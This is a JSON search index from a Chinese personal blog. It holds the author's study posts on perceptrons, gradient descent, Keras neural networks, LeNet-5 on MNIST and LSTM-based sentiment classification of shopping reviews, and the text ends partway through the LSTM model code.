[{"title":"Word2Vec在NLP中的应用","url":"/2023/09/26/Word2Vec%E5%9C%A8NLP%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/","content":"什么是Word2Vec","categories":["AIlearning"],"tags":["AI"]},{"title":"序列依赖问题——文本情感分类","url":"/2022/01/08/%E5%BA%8F%E5%88%97%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E6%9C%AC%E6%83%85%E6%84%9F%E5%88%86%E7%B1%BB/","content":"之前的LeNet-5卷积神经网络模型体现了数据在空间上的关联性，但除此之外，数据也有可能在时间上有关联性，比如气温数据，股票数据等。当然，最典型的还是人类的语言。面对这样在时间上有关联的数据，神经网络该如何去识别和处理呢？\n我们一般把词作为自然语言处理的基本单位，这样就可以利用“词典”用一个数字来代表一个词，这个数字就是索引值。这样，由词组成的一句话就会转化为一个由数字组成的向量，自然就可以送入神经网络进行识别了。\n如果有些词在词典中由于种种原因数据接近，但是含义却相差甚远，这时候如果再进行归一化操作，计算机就很可能错误的识别到完全相反的意思。这样的数据就会给预测模型带来不必要的麻烦。所以我们可以使用one-hot的编码方式对词汇进行编码。通过one-hot编码后每个词都完全不一样。\n但是这样进行严格区分的话，又丢失了词汇的关联性。我们可以提取出一个词汇的多个特征值形成一个词向量，即NLP中的词嵌入。\n最后我们结合一下one-hot和词向量。让词向量组成的矩阵（字典）点乘按词语组成句子的one-hot编码形成的矩阵，这样就可以提取出句子中每一个词的词向量，这样就可以送入神经网络进行学习了。\n明白了原理，我们就来实现一个简单的文本情感分类模型\n首先在网上找到了一个别人爬的网购评论的csv文件，然后封装一个shoppingdata.py用来读取和处理这些数据。\nimport osimport kerasimport numpy as npimport keras.preprocessing.text as textimport reimport jiebaimport randomdef load_data():\txs = []\tys = []\twith open(os.path.dirname(os.path.abspath(__file__))+&#x27;/online_shopping_10_cats.csv&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as f:\t\tline=f.readline()#escape first line&quot;label review&quot;\t\twhile line:\t\t\tline=f.readline()\t\t\tif not line:\t\t\t\tbreak\t\t\tcontents = line.split(&#x27;,&#x27;)\t\t\t# if contents[0]==&quot;书籍&quot;:\t\t\t# \tcontinue\t\t\tlabel = int(contents[1])\t\t\treview = contents[2]\t\t\tif len(review)&gt;20:\t\t\t\tcontinue\t\t\txs.append(review)\t\t\tys.append(label)\txs = np.array(xs)\tys = np.array(ys)\t#打乱数据集\tindies = [i for i in range(len(xs))] \trandom.seed(666)\trandom.shuffle(indies)\txs = xs[indies]\tys = ys[indies]\tm = len(xs)\tcutpoint = int(m*4/5)\tx_train = xs[:cutpoint]\ty_train = ys[:cutpoint]\tx_test = xs[cutpoint:]\ty_test = ys[cutpoint:]\t\tprint(&#x27;总样本数量:%d&#x27; % (len(xs)))\tprint(&#x27;训练集数量:%d&#x27; % (len(x_train)))\tprint(&#x27;测试集数量:%d&#x27; % (len(x_test)))\treturn x_train,y_train,x_test,y_testdef createWordIndex(x_train,x_test):\tx_all = np.concatenate((x_train,x_test),axis=0)\t#建立词索引\ttokenizer = text.Tokenizer()\t#create word index\tword_dic = &#123;&#125;\tvoca = []\tfor sentence in x_all:\t    # 去掉标点\t    sentence = re.sub(&quot;[\\s+\\.\\!\\/_,$%^*(+\\&quot;\\&#x27;]+|[+——！，。？、~@#￥%……&amp;*（）]+&quot;, &quot;&quot;, sentence)\t    # 结巴分词\t    cut = jieba.cut(sentence)\t    #cut_list = [ i for i in cut ]\t    for word in cut:\t    \tif not (word in word_dic):\t    \t\tword_dic[word]=0\t    \telse:\t    \t\tword_dic[word] +=1\t    \tvoca.append(word)\tword_dic = sorted(word_dic.items(), key = lambda kv:kv[1],reverse=True)\tvoca = [v[0] for v in word_dic]\t\ttokenizer.fit_on_texts(voca)\tprint(&quot;voca:&quot;+str(len(voca)))\treturn len(voca),tokenizer.word_indexdef word2Index(words,word_index):\tvecs = []\tfor sentence in words:\t    # 去掉标点\t    sentence = re.sub(&quot;[\\s+\\.\\!\\/_,$%^*(+\\&quot;\\&#x27;]+|[+——！，。？、~@#￥%……&amp;*（）]+&quot;, &quot;&quot;, sentence)\t    # 结巴分词\t    cut = jieba.cut(sentence)\t    #cut_list = [ i for i in cut ]\t    index=[]\t    for word in cut:\t    \tif word in word_index:\t    \t\tindex.append(float(word_index[word]))\t    # if len(index)&gt;25:\t    # \tindex = index[0:25]\t    vecs.append(np.array(index))\treturn np.array(vecs)\n\n首先得到数据的索引表示：\nx_train_index = shopping_data.word2Index(x_train, word_index)x_test_index = shopping_data.word2Index(x_test, word_index)\n\n因为每句话长短不同，我们需要利用keras.preprocessing中的sequence进行一个对齐操作\nmaxlen = 25x_train_index = sequence.pad_sequences(x_train_index, maxlen=maxlen)x_test_index = sequence.pad_sequences(x_test_index, maxlen=maxlen)\n\n首先创造一个Sequential模型，堆叠Embedding层，然后利用Flatten把数据平铺开，再送入一个256-256-256的神经网络中进行训练，最后利用sigmoid函数进行输出。\nmodel = Sequential()model.add(Embedding(trainable=Ture, input_dim=vocalen, output_dim=300, input_length=maxlen))model.add(Flatten())model.add(Dense(256, activation=&#x27;relu&#x27;))model.add(Dense(256, activation=&#x27;relu&#x27;))model.add(Dense(256, activation=&#x27;relu&#x27;))model.add(Dense(1, activation=&#x27;sigmoid&#x27;))\n\n然后使用交叉熵代价函数和adam优化器，训练200回合，批尺寸为512。\nmodel.compile(loss=&#x27;binary_crossentropy&#x27;,               optimizer=&#x27;adam&#x27;,              metrics=[&#x27;accuracy&#x27;])model.fit(x_train_index, y_train,\t\t  batch_size=512,\t\t  epochs=200)\n\n然后开始训练。得到评估结果。\n\n86%的准确度。\n","categories":["AIlearning"],"tags":["AI"]},{"url":"/2025/01/05/1/","content":"\n","categories":["Pic"],"tags":["Presented by Miv4t"]},{"title":"数组的利用与初识Keras","url":"/2022/01/06/%E6%95%B0%E7%BB%84%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%9D%E8%AF%86Keras/","content":"在之前的学习中我一直使用的是方程的形式进行前向传播梯度下降与反向传播。然而随着输入参数与隐藏层的增多，方程形式似乎不再能胜任如此复杂的工作，这时候就需要引入另一个数学工具——矩阵。\nnumpy库是一个强大的数学计算库，使用它可以让矩阵的计算变得简单许多。\n这是利用方程的代码：\nw1 = 0.1w2 = 0.1b = 0.1x1s = xs[:,0]#切割第0列形成一个新的数组x2s = xs[:,1]def forward(x1s,x2s):\tz = w1*x1s + w2*x2s + b\ta = 1/(1+np.exp(-z))\treturn aplot_utils.show_scatter_surface(xs,ys,forward)for _ in range(500):\tfor i in range(m):\t\tx = xs[i]\t\ty = ys[i]\t\tx1 = x[0]\t\tx2 = x[1]\t\ta = forward(x1,x2)\t\te = (y-a)**2\t\tdeda = -2*(y-a)\t\tdadz = a*(1-a)\t\tdzdw1 = x1\t\tdzdw2 = x2\t\tdzdb = 1\t\tdedw1 = deda*dadz*dzdw1\t\tdedw2 = deda*dadz*dzdw2\t\tdedb = deda*dadz*dzdb\t\talpha = 0.01\t\tw1 = w1 - alpha*dedw1\t\tw2 = w2 - alpha*dedw2\t\tb = b - alpha*dedb\n\n这是利用数组的代码：\nW = np.array([0.1, 0.1])B = np.array([0.1])def forward(X):\tZ = X.dot(W.T) + B\tA = 1/(1+np.exp(-Z))\treturn Aplot_utils.show_scatter_surface(X,Y,forward)for _ in range(500):\tfor i in range(m):\t\tXi = X[i]\t\tYi = Y[i]\t\tA = forward(Xi)\t\tE = (Yi-A)**2\t\tdEdA = -2*(Yi-A)\t\tdAdZ = A*(1-A)\t\tdZdW = Xi\t\tdZdB = 1\t\tdEdW = dEdA*dAdZ*dZdW\t\tdEdB = dEdA*dAdZ*dZdB\t\talpha = 0.01\t\tW = W - alpha*dEdW\t\tB = B - alpha*dEdB\n\n可以很直观的发现，使用数组（矩阵）时，代码量会少很多。并且面对越多的输入与隐藏层时，它的优势就会越明显。\n当然，它的拟合度也非常的好。\n\n但是，在面对更加复杂的机器学习，比如卷积神经网络，使用这种编写底层代码的方式将会是个大工程。这时候，Keras就自然而然的进入了我的视野，正如它官网上那样：你恰好发现了Keras\n\n现在，是时候走出对神经网络底层知识的学习，开始进入应用层的大门了。\n为了展现出Keras相较于手撸底层代码的优势，我使用了新的数据集\n\n想要拟合这个数据集无疑会很繁琐，相较于上一个，它又增加了新的隐藏层，这样反向传播的求导过程将十分复杂，但使用Keras后，一切都简单了起来。\nimport datasetimport numpy as npimport plot_utilsfrom keras.models import Sequential from keras.layers import Dense from tensorflow.keras.optimizers import SGDm = 100X, Y = dataset.get_beans4(m)plot_utils.show_scatter(X,Y)model = Sequential()model.add(Dense(units=2, activation=&#x27;sigmoid&#x27;, input_dim=2))model.add(Dense(units=1, activation=&#x27;sigmoid&#x27;,))model.compile(loss=&#x27;mean_squared_error&#x27;, optimizer=SGD(lr=0.05), metrics=[&#x27;accuracy&#x27;])model.fit(X, Y, epochs=5000, batch_size=10)pres = model.predict(X)plot_utils.show_scatter_surface(X, Y, model)\n\n只需要小小的改一个数字就能增加隐藏层，这实在是太方便了。\n\n效果也是非常的好\n","categories":["AIlearning"],"tags":["AI"]},{"title":"深度学习与卷积神经网络","url":"/2022/01/07/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","content":"深度学习深度学习，就是不断增加一个神经网络的隐藏层神经元，让输入的数据被这些神经元不断地抽象和理解，最后得到一个具有泛化能力的预测网络模型。而我们一般把隐藏层超过三层的神经网络称为“深度神经网络”。\n我们很难用精确的数学手段去分析网络中的每一个神经元在想什么，我们能做的也就只有对学习率，激活函数，神经元数量等等方面进行更改，并送入数据进行训练，期待最后的结果。\n想直观的体验这样的过程tensorflow游乐场是个很好的网站（https://playground.tensorflow.org）\n接下来，我就使用Keras来实现一个简单的深度学习。\n这次的散点图就变得更加复杂。\n\n上下螺旋型的分布使得之前写过的所有模型都不再适合，这时候Keras的强大与便捷便体现了出来。只需要调一调参数，增加隐藏层数量，一个更加强的深度神经网络便形成了。\nimport datasetimport numpy as npimport plot_utilsfrom keras.models import Sequential from keras.layers import Dense from tensorflow.keras.optimizers import SGDm = 100X, Y = dataset.get_beans(m)plot_utils.show_scatter(X,Y)model = Sequential()model.add(Dense(units=8, activation=&#x27;relu&#x27;, input_dim=2))model.add(Dense(units=8, activation=&#x27;relu&#x27;,))model.add(Dense(units=8, activation=&#x27;relu&#x27;,))model.add(Dense(units=1, activation=&#x27;sigmoid&#x27;,))model.compile(loss=&#x27;mean_squared_error&#x27;, optimizer=SGD(lr=0.05), metrics=[&#x27;accuracy&#x27;])model.fit(X, Y, epochs=5000, batch_size=10)pres = model.predict(X)plot_utils.show_scatter_surface(X, Y, model)\n\n甚至不需要太多代码就能很好的拟合\n\n卷积神经网络在机器学习，神经网络领域，有一个应用层面上的经典的“hello world”。那就是手写体识别。因为它场景简单明确，更有经典的数据集mnist。\nmnist数据集里是28*28像素的灰度图，用0到255来代表颜色的深浅。我们要怎样将一张图片送入神经网络进行学习呢？没错，我们把这些像素看成数字就好，这将形成一个最小值为0，最大值为255的(28,28)的矩阵，自然就可以送入学习了。\n但是，如果使用全连接神经网络，即使把网络堆叠的越来越深，添加更多的隐藏层，用尽防止过拟合的方法，但泛化能力依旧不尽人意。在深度学习巨头Lecun整理的数据中，效果最好的全连接神经网络是2010年的一个6层的网络，规模已经达到了惊人的2500-2000-1500-1000-500-10，作者也毫不避讳的说到，他们就是硬算，他们有强大的显卡。\n但对于卷积神经网络，即使是早在1998年提出的LeNet-5也比6层的全连接神经网络准确率更高。接下来我就用mnist数据集复现一下这个经典的卷积神经网络。\n为了体现卷积神经网络的优势，我先用全连接神经网络搭建了一个模型。\nfrom keras.datasets import mnistimport numpy as npfrom keras.models import Sequential from keras.layers import Dense from tensorflow.keras.optimizers import SGDimport matplotlib.pyplot as pltfrom tensorflow.keras.utils import to_categorical(X_train, Y_train), (X_test, Y_test) = mnist.load_data() #均为numpy的ndarray类型print(&quot;X_train.shape:&quot;+str(X_train.shape))print(&quot;Y_train.shape:&quot;+str(Y_train.shape))print(&quot;X_test.shape:&quot;+str(X_test.shape))print(&quot;Y_test.shape:&quot;+str(Y_test.shape))print(Y_train[0])plt.imshow(X_train[0], cmap=&#x27;gray&#x27;)plt.show()X_train = X_train.reshape(60000,784)/255.0X_test = X_test.reshape(10000,784)/255.0Y_train = to_categorical(Y_train,10)Y_test = to_categorical(Y_test,10)model = Sequential()model.add(Dense(units=256, activation=&#x27;relu&#x27;, input_dim=784))model.add(Dense(units=256, activation=&#x27;relu&#x27;,))model.add(Dense(units=256, activation=&#x27;relu&#x27;,))model.add(Dense(units=10, activation=&#x27;softmax&#x27;,))model.compile(loss=&#x27;mean_squared_error&#x27;, optimizer=SGD(lr=0.05), metrics=[&#x27;accuracy&#x27;])model.fit(X_train, Y_train, epochs=5000, batch_size=2048)pres = model.predict(X)plot_utils.show_scatter_surface(X, Y, model)\n\n这是一个256-256-256-10的模型。因为使用的是全连接层，所以我使用reshape()函数将600002828和100002828改成了60000784和10000784。又在 X_train 和 X_test 的值后&#x2F;255进行归一化操作，将激活函数改为了更加适合多分类的softmax。运行得到的结果是这样的：\n\n接下来就是复现 LeNet-5 卷积神经网络了\n\n由架构图可以看到，在第一个卷积层，3232的图片被卷成了6个2828的，当然卷积核就是6个55的，步长为1。但由于mnist数据集本身就是2828的图片，所以实现时会有行一些改变。\nmodel.add(Conv2D(filters=6, kernel_size=(5,5), strides=(1,1), input_shape=(28, 28, 1), padding=&#x27;valid&#x27;, activation=&#x27;relu&#x27;))\n\n之后是第一个池化层， LeNet-5使用的是2*2的平均池化。\nmodel.add(AveragePooling2D(pool_size=(2,2)))\n\n之后是第二个卷积层。它使用16个5*5的卷积核\nmodel.add(Conv2D(filters=16, kernel_size=(5,5), strides=(1,1), padding=&#x27;valid&#x27;, activation=&#x27;relu&#x27;))\n\n之后是第二个相同的池化层。我们需要把最后这个池化层的输出平铺成一个数组。使用Keras的Flatten实现\nmodel.add(Flatten())\n\n后面的就是全连接层了。由架构图可以看到，最后是个120-84-10的全连接层\nmodel.add(Dense(units=120, activation=&#x27;relu&#x27;))model.add(Dense(units=84, activation=&#x27;relu&#x27;))model.add(Dense(units=10, activation=&#x27;softmax&#x27;))\n\n这样， LeNet-5 网络就搭建好了。之后将mnist数据集送入训练并评估\nmodel.compile(loss=&#x27;mean_squared_error&#x27;, optimizer=SGD(lr=0.05), metrics=[&#x27;accuracy&#x27;])model.fit(X_train, Y_train, epochs=5000, batch_size=2048)pres = model.predict(X)plot_utils.show_scatter_surface(X, Y, model)\n\n最后得到这样的结果\n\n很明显可以看出是比全连接神经网络更好的。\n","categories":["AIlearning"],"tags":["AI"]},{"title":"激活函数","url":"/2022/01/04/%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/","content":"之前对于一个函数的精确拟合的方式，对于一个智能体来说比较罕见，我们更多的是判断一个一个东西对，或者不对，最多再多一个不确定。这样的判断方式自然就和先前的拟合函数的方法相差甚远。为了达到这样的效果，我们便使用激活函数对之前的预测模型进行分类。而到此，我们才真正接触到了完整的Rosenblatt感知器模型。\n为了进行分类，我们自然一开始就想到分段函数。但是这种函数在代码的层面上比较难以实现，所以，我们便引入了Logistic函数。\n\n当然，我们一般取它的标准形式，即：\n\n对于这样的函数我们可以使用nupmy库的exp()函数来实现：1&#x2F;(1+np.exp(-y))。\n这样我们便可以使用它来对预测结果进行分类了\n利用复合函数求导的知识，对加入了激活函数的预测函数求偏导数。\n              deda = -2*(y-a)dadz = a*(1-a)dzdw = xdedw = deda*dadz*dzdwdzdb = 1dedb = deda*dadz*dzdb\n\n再把这段代码加入之前的代码，在进行一些修改，我们可以得到最后的源码：\nimport datasetimport matplotlib.pyplot as pltimport numpy as npxs, ys = dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)w = 0.1b = 0.1y_pre = w*xs + bplt.plot(xs, y_pre)plt.show()for _ in range(5000):\tfor i in range(100):\t\tx = xs[i]\t\ty = ys[i]\t\t\t\tz = w*x + b\t\ta = 1/(1+np.exp(-z))\t\te = (y-a)**2\t\tdeda = -2*(y-a)\t\tdadz = a*(1-a)\t\tdzdw = x\t\tdedw = deda*dadz*dzdw\t\tdzdb = 1\t\tdedb = deda*dadz*dzdb\t\talpha = 0.05\t\tw = w - alpha*dedw\t\tb = b - alpha*dedb\tif _%100 == 0:\t\tplt.clf()\t\tplt.scatter(xs, ys)\t\tz = w*xs + b\t\ta = 1/(1+np.exp(-z))\t\tplt.xlim(0,1)\t\tplt.ylim(0,1.2)\t\tplt.plot(xs, a)\t\tplt.pause(0.01)#暂停0.01秒\n\n运行后可以观察到：\n很好的对两类数据进行了分类。\n","categories":["AIlearning"],"tags":["AI"]},{"title":"简单的Rosenblatt感知器与二维方差代价函数","url":"/2022/01/02/%E7%AE%80%E5%8D%95%E7%9A%84Rosenblatt%E6%84%9F%E7%9F%A5%E5%99%A8%E4%B8%8E%E4%BA%8C%E7%BB%B4%E6%96%B9%E5%B7%AE%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B0/","content":"简单的Rosenblatt感知器为了使得到的数据更加直观，我使用了python的matplotlib绘制图像\n首先写一个可以获取散点的函数\nimport numpy as npdef get_beans(counts):\txs = np.random.rand(counts)\txs = np.sort(xs)\tys = [1.2*x+np.random.rand()/10 for x in xs]\treturn xs,ys\n\n调用它并使其在坐标系中打印出来\nimport datasetfrom matplotlib import pyplot as pltxs,ys=dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;,fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs,ys)\n\n我们可以得到这样的一个图像\n\n之后任意设定一个权重值w为0.1\n用标准答案减去该参数计算得到的结果得到一个误差，用原来的w加上alpha误差B（乘B是为了应对B为负数时，可能导致结果正好相反的情况，学习率alpha是为了控制调整的幅度，以免幅度过大错过最佳点）作为新的w，再一次进行运算。通过误差修正参数，这就是Rosenblatt感知器的学习过程。当然，这个公式在数学上是收敛的，Novikoff（1962）证明如果训练集是线性分隔的，那么感知器算法可以在有限次迭代后收敛，然而，如果训练集不是线性分隔的，那么这个算法则不能确保会收敛。以下代码简单的实现了 Rosenblatt感知器的学习过程 。\nimport datasetimport numpyfrom matplotlib import pyplot as pltxs, ys = dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)w = 0.5for m in range(100):\tfor i in range(100):\t\tx = xs[i]\t\ty = ys[i]\t\ty_pre = w * x\t\te = y - y_pre\t\talpha = 0.05\t\tw = w + alpha * e * xy_pre = w * xsprint(y_pre)plt.plot(xs, y_pre)plt.show()\n\n这样，运行后就可以得到一条与散点拟合的线\n\n之后任意设定一个权重值w为0.1\n用标准答案减去该参数计算得到的结果得到一个误差，用原来的w加上alpha误差B（乘B是为了应对B为负数时，可能导致结果正好相反的情况，学习率alpha是为了控制调整的幅度，以免幅度过大错过最佳点）作为新的w，再一次进行运算。通过误差修正参数，这就是Rosenblatt感知器的学习过程。当然，这个公式在数学上是收敛的，Novikoff（1962）证明如果训练集是线性分隔的，那么感知器算法可以在有限次迭代后收敛，然而，如果训练集不是线性分隔的，那么这个算法则不能确保会收敛。以下代码简单的实现了 Rosenblatt感知器的学习过程 。\nimport datasetimport numpyfrom matplotlib import pyplot as pltxs, ys = dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)w = 0.5for m in range(100):\tfor i in range(100):\t\tx = xs[i]\t\ty = ys[i]\t\ty_pre = w * x\t\te = y - y_pre\t\talpha = 0.05\t\tw = w + alpha * e * xy_pre = w * xsprint(y_pre)plt.plot(xs, y_pre)plt.show()\n\n这样，运行后就可以得到一条与散点拟合的线\n方差代价函数 Rosenblatt感知器 其本身在现代神经网络研究中已经并不常用了，但我们依旧能从其中学习到参数的自适应调整是一个人工神经元的精髓。\n我们可以使用方差代价函数来评估误差从而达到参数的自适应调整。此时我们再次随便设定一个w，用统计到的数据去评估w的准确性，即回归分析。而我们可以使用最小二乘法来实现。我们将w作为自变量，误差e作为因变量，得到一个新的函数，即代价函数。他展现出当w取不同值时对于环境中问题数据进行预测时产生的误差e。因为他是一个二次函数，我们就可以利用它的最低点的w（此时e最小）带回预测函数，以此实现对参数w的自适应调整。\n在之前代码的基础上进行修改，我们可以得到下面的代码\nimport datasetimport matplotlib.pyplot as pltimport numpy as npxs, ys = dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)w = 0.1 # 可以任意y_pre = w*xsplt.plot(xs, y_pre)plt.show()es = (ys-y_pre)**2 sum_e = np.sum(es)sum_e = (1/100)*sum_eprint(sum_e)ws = np.arange(0,3,0.1)# 从0到3每次增加0.1es = []for w in ws:\ty_pre = w*xs\te = (1/100)*np.sum(ys-y_pre)**2\tes.append(e)# 设定代价函数坐标系plt.title(&quot;cost&quot;, fontsize=12)plt.xlabel(&quot;w&quot;)plt.ylabel(&quot;e&quot;)plt.plot(ws,es)plt.show()w_min = np.sum(xs*ys)/np.sum(xs*xs)print(&quot;eminw:&quot;+str(w_min))y_pre = w_min*xsplt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)plt.plot(xs, y_pre)plt.show()\n\n运行后得到三幅图\n\n\n","categories":["AIlearning"],"tags":["AI"]},{"title":"简单的梯度下降算法实现","url":"/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/","content":"二维梯度下降之前使用的算法是一次性计算出结果，在样本数量比较少的情况下还好，在样本较多的情况下，机器的算力可能不足以快速的计算出结果，这时候就需要使用梯度下降算法，我们先从简单的二维开始，即拟合y&#x3D;wx。\n首先依旧是获取散点，绘制坐标系，预设一个w值为0.1\nimport datasetimport matplotlib.pyplot as pltimport numpy as npxs, ys = dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)w = 0.1y_pre = w*xsplt.plot(xs, y_pre)plt.show()\n\n这次写的是随机梯度下降算法，它的原理简单来说就是计算代价函数（w，e）在某一点的导数，用先前的w值减去学习率*斜率。因为在最低点右边时，斜率大于零，减去后向最低点靠拢，在左边时同理。学习率alpha的功能也是控制震荡幅度。这就是梯度下降。而随机指的是每次随机取样本中的一个数据验证拟合度，以避免在大量样本数时算力不足的情况\n它的代码实现很简单，我在这里使用plt.clf()函数和plt.pause()函数相结合来实现动态图像，使拟合过程更加生动形象。\nfor _ in range(100):\tfor i in range(100):\t\tx = xs[i]\t\ty = ys[i]\t\tk = 2*(x**2)*w + (-2*x*y)\t\talpha = 0.05\t\tw = w - alpha*k\t\tplt.clf()\t\tplt.scatter(xs, ys)\t\ty_pre = w*xs\t\tplt.xlim(0,1)\t\tplt.ylim(0,1.2)\t\tplt.plot(xs, y_pre)\t\tplt.pause(0.01)#暂停0.01秒\n\n\n这样就实现了一个二维的随机梯度下降\n三维梯度下降前面实现的二维梯度下降的算法比简单，但是不是所有的图像都会经过坐标原点，这时候w与e的函数便不再适用。完全的一次函数y&#x3D;wx+b需要我们绘制w，e，b的三维代价函数，来求这个三维图像的最低点，这时候，我们便需要使用三维梯度下降。\n首先我们先来绘制三维的代价函数图像，可以使用matplotlib中的Axed3D来实现。\nimport datasetimport matplotlib.pyplot as pltimport numpy as npfrom mpl_toolkits.mplot3d import Axes3Dm=100xs, ys = dataset.get_beans(m)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.xlim(0,1)plt.ylim(0,1.5)plt.scatter(xs, ys)w = 0.1b = 0.1y_pre = w*xs + bplt.plot(xs,y_pre)plt.show()fig = plt.figure()ax = Axes3D(fig)ax.set_zlim(0,2)ws = np.arange(-1,2,0.1)bs = np.arange(-2,2,0.04)for b in bs:\tes = []\tfor w in ws:\t\ty_pre = w*xs + b\t\te = np.sum((ys-y_pre)**2)*(1/m)\t\tes.append(e)\tax.plot(ws,es,b,zdir=&#x27;y&#x27;)plt.show()\n\n\n我们可以清晰地看到它有一个最低点，接下来我们就使用梯度下降算法得到它。\ndw = 2*(x**2)*w + 2*x*b - 2*x*ydb = 2*b + 2*x*w -2*yalpha = 0.05w = w - alpha*dwb = b - alpha*db\n\n分别求得w和b方向上的斜率，把它们合到一起便实现了一次三维梯度下降\n接下来就再用动态图像来观察三位梯度下降的过程，完整代码如下：\nimport datasetimport matplotlib.pyplot as pltimport numpy as npxs, ys = dataset.get_beans(100)print(xs)print(ys)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)w = 0.1b = 0.1y_pre = w*xs + bplt.plot(xs, y_pre)plt.show()for _ in range(500):\tfor i in range(100):\t\tx = xs[i]\t\ty = ys[i]\t\tdw = 2*(x**2)*w + 2*x*b - 2*x*y\t\tdb = 2*b + 2*x*w -2*y\t\talpha = 0.01\t\tw = w - alpha*dw\t\tb = b - alpha*db\tplt.clf()\tplt.scatter(xs, ys)\ty_pre = w*xs + b\tplt.xlim(0,1)\tplt.ylim(0,1.2)\tplt.plot(xs, y_pre)\tplt.pause(0.01)#暂停0.01秒\n\n最后能得到这样的效果\n\n","categories":["AIlearning"],"tags":["AI"]},{"title":"自然语言处理（NLP）——LSTM网络","url":"/2022/01/09/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%EF%BC%88NLP%EF%BC%89%E2%80%94%E2%80%94LSTM%E7%BD%91%E7%BB%9C/","content":"使用全连接神经网络来处理自然语言未免有些乏力，之前也可以看出准确率并不是很高，这时候就需要另一种专为NLP而生的网络——LSTM网络（长短时记忆网络）。\n想要学习这个网络，得先从RNN看起。循环神经网络（Recurrent Neural Network，RNN）是一种用于处理序列数据的神经网络。相比一般的神经网络来说，他能够处理序列变化的数据。它的激活函数多采用双曲正切函数tanh而不是relu，当然也可以使用relu。而为了每一步操作的统一性，在第一步时会手动添加一个共同输入a0，比如一个全0向量。\n而完全体的LSTM是比较复杂的\n\n首先LSTM结构中的输出再次经过一个tanh函数，而原先的输出，就变成了一个叫做细胞状态（Ct）的东西，这个细胞状态就是LSTM能应对长依赖问题的关键，它就能让网络具有记忆和遗忘的效果。为了实现这个效果，LSTM使用了两个门来实现。第一个是遗忘门（forget gate）。使用一个sigmoid层，使其与上个细胞状态值相乘。当sigmoid为0时，就相当于把上个细胞值完全丢弃，即忘记。反之则全部记忆。而这个sigmoid层的输入则是本次词向量与上一次的输出合并的数据，这样就可以通过本次与之前的数据共同决定忘记多少之前的细胞值。第二个是更新门（update gate）。让本次的词向量与上一此的输出合并的数据在经过一个sigmoid层形成控制这个在之前标准RNN结构中用来更新的部分，即用来控制是否更新本次细胞状态值。这样就实现了记忆和遗忘的效果。而最后还有一个输出门，在标准RNN结构最后的输出也乘一个sigmoid层，这样在遇到重要词汇时产生强输出，使其难以遗忘，反之亦然。\n当然这只是对LSTM的及其粗略的讲解，这篇博客有着更加详细的讲解，还有LSTM变种结构比如GRU的介绍。\nhttps://colah.github.io/posts/2015-08-Understanding-LSTMs/\n之后就是利用LSTM对之前的网购评论数据进行学习了。\n我在GitHub上找到了一个训练好的中文词向量\nhttps://github.com/Embedding/Chinese-Word-Vectors\n利用这个词向量来训练LSTM网络\n首先封装一个能读取这个词向量文件的chinese_vec.py\nimport osimport numpy as npdef load_word_vecs():\tembeddings_index = &#123;&#125;\tf = open(os.path.dirname(os.path.abspath(__file__))+&#x27;/sgns.target.word-word.dynwin5.thr10.neg5.dim300.iter5&#x27;,encoding=&#x27;utf8&#x27;)\tf.readline()#escape first line\tfor line in f:\t    values = line.split()\t    word = values[0]\t    coefs = np.asarray(values[1:], dtype=&#x27;float32&#x27;)\t    embeddings_index[word] = coefs\tf.close()\tprint(&#x27;Found %s word vectors.&#x27; % len(embeddings_index))\treturn embeddings_index\n\n然后调用它读取，在经过判断是否存在后写入一个空数组。\nword_vecs = chinese_vec.load_word_vecs()embedding_matrix = np.zeros((vocalen, 300))for word, i in word_index.items():\tembedding_vector = word_vecs.get(word)\tif embedding_vector is not None:\t\tembedding_matrix[i] = embedding_vector\n\n然后就是构造LSTM，使用Keras可以十分简单\nmodel = Sequential()model.add(Embedding(trainable=False, weights=[embedding_matrix], input_dim=vocalen, output_dim=300, input_length=maxlen))model.add(LSTM(128, 